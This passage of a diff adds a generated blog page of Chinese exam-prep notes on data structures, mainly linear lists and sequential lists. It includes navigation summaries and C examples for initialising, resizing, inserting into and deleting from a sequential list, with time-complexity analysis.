S.data[S.top--]; return true; } bool GetTop(SqStack &amp;amp;amp;S, Elemtype &amp;amp;amp;e) { if (S.top == -1) { //栈为空，无法读取 return false; } e = S.data[S.top]; return true; } 2. top 表示“下一个可存放元素的位置” 注意一开始 top 指针置为 0
+">数据结构之栈、队列和数组</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E7%BA%BF%E6%80%A7%E8%A1%A8/" class="article-link" data-summary="数据结构之绪论与线性表 第二章_线性表 2.1 线性表的定义和基本操作 2.1.1 线性表的定义 线性表是由n(n&amp;amp;gt;=0)个相同数据类型的元素组成的有限序列（数据类型相同，有限，有序）
+本小节介绍的线性表是一种逻辑结构，在线性表的重要术语中需要特别注意位序这一概念与数组下标的不同之处：位序是线性表中元素的逻辑位置（从 1 开始编号），数组下标是存储结构中的物理索引（通常从 0 开始），只有在线性表采用数组实现时，二者才满足位序 = 下标 &#43; 1。
+2.1.2 线性表的基本操作 线性表的基本操作，本质上就是数据结构三要素中“数据的运算”的具体体现。由于大多数高校采用严蔚敏版教材，这里介绍的函数名也采用这版的：
+InitList(&amp;amp;amp;L)：初始化表。构造一个空的线性表 L，并分配内存空间。 DestroyList(&amp;amp;amp;L)：销毁操作。销毁线性表，并释放线性表 L 所占用的内存空间。 ListInsert(&amp;amp;amp;L, i, e)：插入操作。在表 L 中的第 i 个位置上插入指定元素 e。 ListDelete(&amp;amp;amp;L, i, &amp;amp;amp;e)：删除操作。删除表 L 中第 i 个位置的元素，并用 e 返回删除的元素值。 LocateElem(L, e)：按值查找操作。在表 L 中查找具有给定关键字值的元素。 GetElem(L, i)：按位查找操作。获取表 L 中第 i 个位置的元素的值。 Length(L)：求表长。返回线性表 L 的长度，即 L 中数据元素的个数。 PrintList(L)：输出操作。按前后顺序输出线性表 L 的所有元素值。 Empty(L)：判空操作。若 L 为空表，则返回 true，否则返回 false。 2.2 顺序表 本小节思维导图如下： 2.2.1 顺序表的定义 线性表的顺序存储也称顺序表。它是用一段地址连续的存储单元依次存储线性表中的数据元素，使得逻辑上相邻的元素在物理位置上也相邻。顺序表的逻辑顺序和存储顺序完全一致
+">数据结构之线性表</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E7%BB%AA%E8%AE%BA/" class="article-link" data-summary="数据结构之绪论 第一章_绪论 1.1 数据结构在学什么 如何用程序代码把现实世界的问题信息化 如何用计算机高效地处理这些信息从而创造价值 只有详细学习过这四门课的人才能够更好理解信息化，这也是计算机专业的学生和只会写代码的人的区别所在 1.2 数据结构的基本概念 本小节会对数据结构中的基本概念做简单讲解，目的在于了解和理解概念，具体的深入了解会在后面的章节中提到，本小节的思维导图如下： 1.2.1 基本概念 1.2.1.1 数据 数据是信息的载体，是描述客观事物属性的数、字符及所有能输入到计算机中并被计算机程序识别和处理的符号的集合，数据是计算机程序加工的原料。
+简单来看，在计算机的世界中，数据就是0和1
+1.2.1.2 数据元素、数据项 数据元素是数据的基本单位，通常作为一个整体进行考虑和处理。一个数据元素可由若干数据项组成，数据项是构成数据元素的不可分割的最小单位
+其实什么是数据元素什么是数据项，得根据实际的业务需求来确定，比如以微博举例：每一个账号为一个数据元素，而账号里的每一个信息为一个数据项： 1.2.1.3 数据结构、数据对象 数据结构是相互之间存在一种或者多种特定关系的数据元素的集合，数据对象是具有相同性质的数据元素的集合。
+其实简单理解就是数据对象是一堆相同性质的数据集合，而数据结构是在数据对象的基础上，还规定了数据结构的三要素&amp;amp;ndash;逻辑关系，存储结构，数据的运算。
+1.2.1.4 数据类型、抽象数据类型 数据类型是一个值的集合和定义在此集合上的一组操作的总称。分为原子类型（其值不可再分的数据类型）和结构类型（其值可以分解成若干成分的数据类型）
+抽象数据类型(Abstract Data Type,ADT) 是抽象数据组织及与之相关的操作
+若从数据结构的三要素来进行讨论，数据类型和抽象数据类型都只是实现了逻辑结构和数据的运算，不涉及具体的存储结构和实现细节。
+1.2.2 数据结构三要素 非常重要，我们再数据结构的学习中，任何涉及到数据结构的地方，首先想到的就应该是三要素
+1.2.2.1 逻辑结构 数据的逻辑结构只分为以下的四种结构，在考研数据结构中主要是讨论后三种逻辑结构：
+集合：各个数据元素同属一个集合，之间没有任何关系。 线性结构：数据元素之间是一对一的关系，除了第一个元素，所有的元素都有唯一前驱，除了最后一个元素，任何元素都有唯一后继 树形结构，就像树枝一样，数据元素之间是一对多的关系，比如本小节开始给的思维导图就是树形结构的关系 图结构：数据元素之间存在多对多的关系，像一张网一样。 1.2.2.2 存储结构（物理结构） 数据的存储结构（物理结构）是指数据在计算机内存中的存储方式，常见有以下四种：
+顺序存储：把逻辑上相邻的元素存储在物理位置上也相邻的存储单元中，元素之间的关系由存储单元的邻接关系来体现，要求给数据元素分配的是一片连续的内存空间，就像C语言中的数组。 链式存储：逻辑上相邻的元素可能在物理位置上表示不相邻，借助指示元素存储地址的指针来表示元素间的逻辑地址关系，就像C语言中的链表。 索引存储：在存储元素信息的同时，还建立附加的索引表。索引表中的每项称为索引项，索引项的一般形式是（关键字，地址）。就像操作系统中分页存储中的页表。 散列存储：根据元素的关键字通过散列函数直接计算出元素的存储地址，又称哈希(Hash)存储。具体比较复杂，后面在做讲解，这里了解就好。 1.2.2.3 数据的运算 数据的运算是施加在数据上的运算，包括运算的定义和实现。运算的定义是针对逻辑结构的，指出运算的功能；运算的实现是针对存储结构的，指出运算的具体操作步骤。
+主要就是数据结构的创销，增删改查。
+数据的运算（“能对数据做什么”） │ ├── 运算的定义（面向逻辑结构） │ ├── 插入 │ ├── 删除 │ ├── 查找 │ ├── 修改 │ └── 遍历 │ └── 运算的实现（面向存储结构） ├── 顺序存储：移动元素 / 下标访问 ├── 链式存储：修改指针 ├── 索引存储：先查索引再访问数据 └── 散列存储：通过散列函数定位 1.3 算法的基本概念 算法（Algorithm）是对特定问题求解步骤的描述，是一个有穷的指令序列，其中每条指令表示一个或者多个操作。
+">数据结构之绪论</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>计算机网络</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E8%80%83%E7%A0%94/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" class="article-link" data-summary="计算机网络体系结构 第一章_计算机网络的概念 1.1 计算机网络概述 1.1.1 计算机网络的概念 首先我们简单的认识三个设备：
+集线器：将多个不同终端连接起来，但是当某个设备发送数据时，集线器会把数据广播到所有端口，无法处理数据冲突，经常卡顿。集线器也能连接集线器，现在已经被淘汰了。 交换机：集线器的升级版，用于将不同终端连接起来，交换机可以根据 MAC 地址表 将数据 只转发到目标端口，而不是广播到所有端口，可以处理数据冲突。用于网络内部，交换机上也能连接交换机。 路由器：用于连接不同的网络，根据 IP 地址 选择数据包的最佳传输路径。家用路由器 = 路由器 &#43; 交换机 &#43; 其他功能 认识了这三个设备之后，我们需要严格区分以下三个概念：
+计算机网络（简称网络）：计算机网络是由若干节点（Node，或译为结点）和连接这些结点的链路组成，结点可以是计算机、集线器、交换机或路由器等。多个网络可以通过交换机互连，构成更加覆盖范围更广的计算机网络。 互连网（internet）：是一个通用名词，泛指多个计算机网络互连而成的网络网络之间可以采用任意通信协议进行通信。 互联网（Internet，因特网）：是一个专用名词，特指当前最大最开放的由众多网络和路由器互连而成的特定计算机网络。它必须采用TCP/IP协议族作为通信规则。 网络的最终用户通过互联网服务提供商（Internet Service Provider，ISP） 接入互联网，例如中国电信、中国移动等。所谓上网，是指通过某 ISP 分配的 IP 地址接入互联网。ISP 可从互联网管理机构申请大量 IP 地址（互联网上的主机都必须拥有 IP 地址才能接入互联网，这一点将在第 4 章中讨论），并拥有通信线路及路由器等连网设备。因此，任何机构或个人只要向 ISP 缴纳费用，就可获得所需 IP 地址的使用权，并通过该 ISP 接入互联网。
+1.1.2 计算机网络的组成 从不同角度看，计算机网络的组成可以分为以下几类： 1.1.3 计算机网络的功能 计算机的功能是多种多样的，现今许多应用都依赖于网络的支持，主要有以下五大功能。
+数据通信：数据通信是计算机网络最基本的功能，用来实现计算机之间各种信息的传输。例如，文件传输、电子邮件等应用，离开了计算机网络将无法实现。 资源共享：资源共享可以是软件、硬件或数据资源的共享。 分布式处理：当网络中的某个计算机系统负荷过重时，可将其处理的某个复杂任务分配给网络中的其他计算机系统。例如：矩阵的乘法 提高可靠性：计算机网络中的每台计算机可以通过网络互为备份。例如：网盘不仅给你存储还给你备份。 负载均衡：将工作任务均衡地分配给网络中的多台计算机，避免某台计算机因负载过重而瘫痪。 除了上述主要功能外，计算机网络还能支持电子化办公与应用服务、远程教育等功能，满足了社会的各种信息化需求。
+1.1.4 电路交换，报文交换，分组交换 首先先抛开我们脑海中已有的计算机网络拓扑图。在 1960 年代，美国科学家们开始研究使用什么技术实现数据交换，那时候可还没有计算机网络。
+1.1.4.1 电路交换 这是仿照了传统电话的通信方式，就是一种端对端的通信方式，电路交换分为三个阶段：建立连接（占用通信资源）、传输数据（持续占用通信资源）和释放连接（归还通信资源），在通信过程中这条通路始终被通信双方独占，示意如图所示： 电路交换技术的优点：
+通信时延小：通信线路为双方专用，数据直达，传输效率高。 有序传输：数据按发送顺序传送，不存在失序问题。 没有冲突：不同通信对使用独立信道，不会争用物理信道。 实时性强：物理通路一旦建立，双方即可随时通信。 电路交换技术的缺点：
+">计算机网络体系结构</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+  
+</div>
+  <div class="content-center">
+    <article class="markdown-body">
+      <h1 class="post-title-template">数据结构之线性表</h1>
+      <div class="post-date" style="margin-bottom: 20px; color: var(--text-color); opacity: 0.7; font-size: 0.9em;">
+        
+        
+            2026-02-04
+        
+      </div>
+      <h1 id="数据结构之绪论与线性表">数据结构之绪论与线性表</h1>
+<h2 id="第二章_线性表">第二章_线性表</h2>
+<h3 id="21-线性表的定义和基本操作">2.1 线性表的定义和基本操作</h3>
+<h4 id="211-线性表的定义">2.1.1 线性表的定义</h4>
+<blockquote>
+<p>线性表是由n(n&gt;=0)个<strong>相同数据类型</strong>的元素组成的<strong>有限序列</strong>（数据类型相同，有限，有序）</p>
+</blockquote>
+<p>本小节介绍的线性表是一种<strong>逻辑结构</strong>，在线性表的重要术语中需要特别注意<strong>位序</strong>这一概念与<strong>数组下标</strong>的不同之处：位序是线性表中元素的<strong>逻辑位置（从 1 开始编号）</strong>，数组下标是存储结构中的<strong>物理索引（通常从 0 开始）</strong>，只有在线性表采用数组实现时，二者才满足位序 = 下标 + 1。</p>
+<h4 id="212-线性表的基本操作">2.1.2 线性表的基本操作</h4>
+<p>线性表的基本操作，本质上就是数据结构三要素中“数据的运算”的具体体现。由于大多数高校采用严蔚敏版教材，这里介绍的函数名也采用这版的：</p>
+<ul>
+<li>InitList(&amp;L)：初始化表。构造一个空的线性表 L，并分配内存空间。</li>
+<li>DestroyList(&amp;L)：销毁操作。销毁线性表，并释放线性表 L 所占用的内存空间。</li>
+<li>ListInsert(&amp;L, i, e)：插入操作。在表 L 中的第 i 个位置上插入指定元素 e。</li>
+<li>ListDelete(&amp;L, i, &amp;e)：删除操作。删除表 L 中第 i 个位置的元素，并用 e 返回删除的元素值。</li>
+<li>LocateElem(L, e)：按值查找操作。在表 L 中查找具有给定关键字值的元素。</li>
+<li>GetElem(L, i)：按位查找操作。获取表 L 中第 i 个位置的元素的值。</li>
+<li>Length(L)：求表长。返回线性表 L 的长度，即 L 中数据元素的个数。</li>
+<li>PrintList(L)：输出操作。按前后顺序输出线性表 L 的所有元素值。</li>
+<li>Empty(L)：判空操作。若 L 为空表，则返回 true，否则返回 false。</li>
+</ul>
+<h3 id="22-顺序表">2.2 顺序表</h3>
+<p>本小节思维导图如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260204195752549.png" alt=""></p>
+<h4 id="221-顺序表的定义">2.2.1 顺序表的定义</h4>
+<blockquote>
+<p>线性表的顺序存储也称<strong>顺序表</strong>。它是用一段<strong>地址连续的存储单元</strong>依次存储线性表中的数据元素，使得<strong>逻辑上相邻的元素在物理位置上也相邻</strong>。顺序表的<strong>逻辑顺序和存储顺序完全一致</strong></p>
+</blockquote>
+<p>由于任意元素的存储地址与顺序表起始地址之间的偏移量和位序之间存在着线性关系，所以访问表中任意位置元素的时间复杂度为<strong>O(1)</strong>，这种特性使得线性表的顺序存储结构属于<strong>随机存取（不按顺序遍历，直接访问任意一个位置的数据）</strong>。比如在《考研视角下的C语言(中)》这篇文章中提到过，访问数组中的元素只需使用 <strong>[ ]运算符(*(首地址+偏移量))</strong> 即可，所以在高级程序设计语言中，我们也通常使用<strong>数组来实现顺序表</strong>。</p>
+<h4 id="222-顺序表的两种实现方式">2.2.2 顺序表的两种实现方式</h4>
+<p>下面使用<strong>静态数组</strong>（静态分配）示例顺序表的实现：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define MaxSize 10    </span><span class="c1">//定义最大长度
+</span></span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">data</span><span class="p">[</span><span class="n">MaxSize</span><span class="p">];</span><span class="c1">//用静态的“数组”存放数据元素
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>       <span class="c1">//顺序表的当前长度
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="n">SqList</span><span class="p">;</span>              <span class="c1">//顺序表的类型定义
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//基本操作—初始化一个顺序表
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">InitList</span><span class="p">(</span><span class="n">SqList</span> <span class="o">&amp;</span><span class="n">L</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">L</span><span class="p">.</span><span class="n">length</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>       <span class="c1">//顺序表初始长度为0
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SqList</span> <span class="n">L</span><span class="p">;</span>         <span class="c1">//声明一个顺序表
+</span></span></span><span class="line"><span class="cl">    <span class="nf">InitList</span><span class="p">(</span><span class="n">L</span><span class="p">);</span>      <span class="c1">//初始化顺序表
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//尝试“违规”打印整个 data 数组,正常来说使用的是i&lt;L.length
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//而且通常不直接写在mian函数中，使用GetElem()函数实现
+</span></span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">MaxSize</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;data[%d]=%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">L</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>上述代码中有一个初始化为0的函数操作，这是为了防止读取到<strong>脏数据</strong>，通常C语言会自动设置为0，但是这是C语言编译器的行为，如果换一个编译器可能就不行了，做题时最好写上InitList函数。</p>
+<p>下面使用<strong>动态数组</strong>（动态分配）示例顺序表的实现，动态分配改变数组大小，本质上是重新申请一片更大的内存空间，然后全部迁移原数组，代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define InitSize 10  </span><span class="c1">// 默认的最大长度
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 动态顺序表的结构定义
+</span></span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>       <span class="c1">// 指向动态分配数组的指针
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">MaxSize</span><span class="p">;</span>     <span class="c1">// 顺序表的最大容量
+</span></span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">length</span><span class="p">;</span>      <span class="c1">// 顺序表的当前长度
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">SeqList</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 初始化顺序表
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">InitList</span><span class="p">(</span><span class="n">SeqList</span> <span class="o">&amp;</span><span class="n">L</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 用 malloc 申请一片连续的存储空间
+</span></span></span><span class="line"><span class="cl">    <span class="n">L</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">InitSize</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">L</span><span class="p">.</span><span class="n">length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">L</span><span class="p">.</span><span class="n">MaxSize</span> <span class="o">=</span> <span class="n">InitSize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 增加动态数组的长度
+</span></span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">IncreaseSize</span><span class="p">(</span><span class="n">SeqList</span> <span class="o">&amp;</span><span class="n">L</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">L</span><span class="p">.</span><span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 申请更大的空间
+</span></span></span><span class="line"><span class="cl">    <span class="n">L</span><span class="p">.</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">((</span><span class="n">L</span><span class="p">.</span><span class="n">MaxSize</span> <span class="o">+</span> <span class="n">len</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 将数据复制到新区域
+</span></span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">L</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">L</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 更新最大容量
+</span></span></span><span class="line"><span class="cl">    <span class="n">L</span><span class="p">.</span><span class="n">MaxSize</span> <span class="o">=</span> <span class="n">L</span><span class="p">.</span><span class="n">MaxSize</span> <span class="o">+</span> <span class="n">len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 释放原来的内存空间
+</span></span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SeqList</span> <span class="n">L</span><span class="p">;</span>          <span class="c1">// 声明一个顺序表
+</span></span></span><span class="line"><span class="cl">    <span class="nf">InitList</span><span class="p">(</span><span class="n">L</span><span class="p">);</span>        <span class="c1">// 初始化顺序表
+</span></span></span><span class="line"><span class="cl">    <span class="c1">// ...往顺序表中随便插入几个元素...
+</span></span></span><span class="line"><span class="cl">    <span class="nf">IncreaseSize</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span> <span class="c1">// 增加顺序表长度
+</span></span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h4 id="223-顺序表的插入">2.2.3 顺序表的插入</h4>
+<p><strong>顺序表的插入操作</strong>实现代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">ListInsert</span><span class="p">(</span><span class="n">Sqlist</span><span class="o">&amp;</span> <span class="n">L</span><span class="p">,</span> <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">ElemType</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">1</span> <span class="o">||</span> <span class="n">i</span><span class="o">&gt;</span><span class="n">L</span><span class="p">.</span><span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">L</span><span class="p">.</span><span class="n">length</span> <span class="o">&gt;=</span> <span class="n">MaxSize</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//判断存储空间满没满
+</span></span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="n">L</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">j</span> <span class="o">&gt;=</span> <span class="n">i</span><span class="p">;</span> <span class="n">j</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//将第i个元素及以后的元素后移
+</span></span></span><span class="line"><span class="cl">		<span class="n">L</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">L</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="n">j</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">L</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">L</span><span class="p">.</span><span class="n">length</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>注意：i和L.length都是位序，所以1到L.length+1都是合法的插入位置。而在进行后移和插入操作的时候是对下标进行的操作所以最多从第L.length位开始后移</p>
+<p>最好时间复杂度：在表尾插入元素（i=n+1)，时间复杂度为<strong>O(1)</strong>。
+最坏时间复杂度：在表头插入元素（i=1），需移动全部n个元素，时间复杂度为<strong>O(n)</strong>
+平均时间复杂度：设元素插入任意一个位置的概率相同为p=1/(n+1)，则平均移动次数为：n*p+(n-1)*p+&hellip;+1*p = n*(n+1)/2 * 1/(n+1) = n/2，所以平均时间复杂度为<strong>O(n)</strong>
+<br></p>
+<h4 id="224-顺序表的删除">2.2.4 顺序表的删除</h4>
+<p><strong>顺序表的删除操作</strong>实现代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">ListDelete</span><span class="p">(</span><span class="n">Sqlist</span><span class="o">&amp;</span> <span class="n">L</span><span class="p">,</span> <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">ElemType</span><span class="o">&amp;</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">1</span> <span class="o">||</span> <span class="n">i</span><span class="o">&gt;</span><span class="n">L</span><span class="p">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">e</span> <span class="o">=</span> <span class="n">L</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span> <span class="c1">//将被删除的元素赋值给e带出去
+</span></span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">L</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//将第i个元素之后的位置前移
+</span></span></span><span class="line"><span class="cl">		<span class="n">L</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="n">j</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">L</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">L</span><span class="p">.</span><span class="n">length</span><span class="o">--</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>最好时间复杂度：在表尾删除元素（i=n+1)，时间复杂度为<strong>O(1)</strong>。
+最坏时间复杂度：在表头删除元素（i=1），需移动全部n个元素，时间复杂度为<strong>O(n)</strong>
+平均时间复杂度：设元素插入任意一个位置的概率相同为p=1/n，则平均移动次数为：(n-1)*p+&hellip;+1*p = n*(n+1)/2 * 1/n = (n-1)/2，所以平均时间复杂度为<strong>O(n)</strong></p>
+<h4 id="225-顺序表的查找">2.2.5 顺序表的查找</h4>
+<p><strong>顺序表的查找操作</strong>分为两种，一种是按位序查找，一种是按值查找。按位序查找很简单时间复杂度为O(1)，按值查找的实现代码如下：</p>
